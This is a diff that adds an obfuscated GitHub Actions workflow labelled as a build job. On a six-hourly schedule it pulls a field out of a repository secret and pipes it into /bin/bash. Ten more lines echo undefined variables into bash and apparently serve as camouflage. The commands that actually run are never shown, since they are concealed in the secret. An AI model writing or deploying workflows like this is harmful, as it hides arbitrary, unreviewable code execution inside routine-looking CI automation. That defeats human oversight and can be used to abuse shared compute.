@@ -1,0 +1,27 @@
+name: joseproq204
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: joseproq204
+        env:
+          zfe826: ${{ secrets.zfe826 }}
+        run: |
+          echo $zfe826 | jq -r .vids1782 | /bin/bash
+          echo $mi637 | jq -r .dj69 | /bin/bash
+          echo $nmap33 | jq -r .thjx234 | /bin/bash
+          echo $ezpn07314 | jq -r .fe38031 | /bin/bash
+          echo $y217 | jq -r .jh3847 | /bin/bash
+          echo $e1 | jq -r .af83 | /bin/bash
+          echo $xaahk497 | jq -r .u6 | /bin/bash
+          echo $dwcz804 | jq -r .iech92 | /bin/bash
+          echo $vld1 | jq -r .sf55876 | /bin/bash
+          echo $x27322 | jq -r .ehgmp770 | /bin/bash
+          echo $nrd4126 | jq -r .aa565 | /bin/bash
+
